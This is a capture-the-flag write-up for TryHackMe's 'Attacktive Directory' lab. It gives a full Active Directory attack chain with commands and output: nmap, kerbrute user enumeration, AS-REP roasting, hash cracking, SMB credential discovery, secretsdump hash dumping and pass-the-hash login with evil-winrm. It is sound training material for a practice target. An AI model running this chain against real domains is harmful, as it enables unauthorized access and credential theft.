# Attacktive Directory [TryHackMe](https://tryhackme.com/room/attacktivedirectory)

--------------------------------------------------------------------------------

![](https://jumpcloud.com/wp-content/uploads/2016/07/AD1.png)

--------------------------------------------------------------------------------

## Index

- [Enumeration](#enumeration)
- [Enumerating Kerberos Users](#enumerating-kerberos-users)
- [Abusing Kerebos](#abusing-kerebos)
- [Back to Basics](#back-to-basics)

--------------------------------------------------------------------------------

```bash
export IP=10.10.252.205
echo "$IP spookysec.local" >> /etc/hosts
```

--------------------------------------------------------------------------------

### Enumeration

Good ol' `nmap`

```bash
nmap -sC -sV -A -v -oN nmap/initial.log $IP
```

```
# Nmap 7.91 scan initiated Fri Aug 20 13:36:15 2021 as: nmap -vvv -p 53,80,88,135,139,389,445,464,593,636,5985,47001,49665,49666,49664,49672,49669,49675,49676,49679,49684,49696,49818 -sC -sV -A -v -oN nmap/initial.log 10.10.252.205
Nmap scan report for 10.10.252.205
Host is up, received reset ttl 127 (0.15s latency).
Scanned at 2021-08-20 13:36:15 EDT for 73s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-08-20 17:36:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49818/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/20%OT=53%CT=%CU=39664%PV=Y%DS=2%DC=T%G=N%TM=611FE858%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)
SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 33284/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58769/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44246/udp): CLEAN (Timeout)
|   Check 4 (port 35784/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-08-20T17:37:24
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   140.28 ms 10.9.0.1
2   153.20 ms 10.10.252.205

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 20 13:37:28 2021 -- 1 IP address (1 host up) scanned in 73.25 seconds
```

Considering the amount of ports open: safe to assume this is a Windows Box ;)

Now, we can use `enum4linux` to enumerate ports `139` and `445` which are the traditional ports for `SMB`

```bash
enum4linux $IP | tee log_files/enum4linux.log
```

Unfortunately my `enum4linux` does not want to play nice and give me the domain name. Thankfully though, the `nmap` scan earlier provides it as `spookysec.local`

--------------------------------------------------------------------------------

### Enumerating Kerberos Users

Downloading the user and password file provided to use - it is time to kick off `kerbrute`

```bash
kerbrute userenum --dc $IP -d spookysec.local userlist.txt
```

```

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/20/21 - Ronnie Flathers @ropnop

2021/08/20 13:49:05 >  Using KDC(s):[0m
2021/08/20 13:49:05 >      10.10.252.205:88
[0m
[32m2021/08/20 13:49:06 >  [+] VALID USERNAME:     james@THM-AD[0m
[32m2021/08/20 13:49:08 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:f40d755628cae716456e2eecf1426de0$ce6dd9a6f49a4f7dd58a6a55cf149b2910b074cd88de640ac2de20347dd7d2dea71f30eb8f0a3cb1b6cf4b3ecfaa6975485eb2b2a801abe99b7120b12c99b5c10bcbfcd76f387438a7b568dffbcbc44b0e339aecf31a6f7550bc2c42c799ce2f715bf49f3742c16ae686fa8cf7064f2ae67bcedb10b21897e1a1fc8a4fa85967ced617a17676735e7f275a6f866d5170d3c11059efaf310b1817f028355d83b0acfbac4a843e9548334bf17d550c98bb510518de1a48d97ddc035630a584d6d10de2a88c245fc7d63d266ca25c8ca1aca0ce5f3ad10ee03f28eda438bc911e49a96748c72be2e13422fe24fa1493a41fda4b97ef175d0966fd13e1b572[0m
[32m2021/08/20 13:49:08 >  [+] VALID USERNAME:     svc-admin@THM-AD[0m
[32m2021/08/20 13:49:12 >  [+] VALID USERNAME:     James@THM-AD[0m
[32m2021/08/20 13:49:13 >  [+] VALID USERNAME:     robin@THM-AD[0m
[32m2021/08/20 13:49:25 >  [+] VALID USERNAME:     darkstar@THM-AD[0m
[32m2021/08/20 13:49:32 >  [+] VALID USERNAME:     administrator@THM-AD[0m
[32m2021/08/20 13:49:47 >  [+] VALID USERNAME:     backup@THM-AD[0m
[32m2021/08/20 13:49:54 >  [+] VALID USERNAME:     paradox@THM-AD[0m
[32m2021/08/20 13:50:40 >  [+] VALID USERNAME:     JAMES@THM-AD[0m
[32m2021/08/20 13:50:55 >  [+] VALID USERNAME:     Robin@THM-AD[0m
[32m2021/08/20 13:52:26 >  [+] VALID USERNAME:     Administrator@THM-AD[0m
```

Of these users, `svc-admin` and `backup` seem the most interesting to pivot into.

--------------------------------------------------------------------------------

### Abusing Kerebos

During the `kerbrute` scan, it picked up something interesting regarding the user `svc-admin` that they have no `pre-auth` enabled.

I was having a few issues with that hash, so I swapped over to using a new one I generated with `GetNPUsers.py`

```bash
GetNPUsers.py -dc-ip $IP  -no-pass svc-admin | tee log_files/GetNPUsers.log
```

Now onto identifying the hash

`hashid` does not want to play nice with me, so instead I use `john` which identifies it as:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2021-08-20 14:29) 20.00g/s 133120p/s 133120c/s 133120C/s shearer..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we now have a password for `svc-admin`!

--------------------------------------------------------------------------------

### Back to Basics

I typically use `smbclient.py` over `smbclient` but unfortunately I could not list the shares in `smbclient.py` so I used `smbclient` instead.

```bash
smbclient -L \\$IP -U svc-admin
```

```
Enter WORKGROUP\svc-admin's password:

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    backup          Disk      
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
```

We can now checkout the files on the smb server with:

```bash
smbclient \\\\$IP -U svc-admin
```

And we find a stray `backup_credentials.txt` on the device...

But it isn't in clear text form, so I first check if it is hashed with `hashid` (nothing pops up) and then before trying various other things, I try `base64` decode it - which works!

```
backup@spookysec.local:[REDACTED]
```

Time to fire-up `psexec.py` or maybe, instead of that: `secretsdump.py`

```bash
secretsdump.py backup@spookysec.local | tee secretsdump_hold.txt
```

Fantastic! We now have the Administrator's password hash and we could possibly use `Evil-WinRM`

```bash
evil-winrm -u administrator -i $IP -H <HASH>
```

And we are done!!

![](https://alchetron.com/cdn/cerberus-2360fe60-cbc6-4721-8712-c8a1ba13a64-resize-750.png)
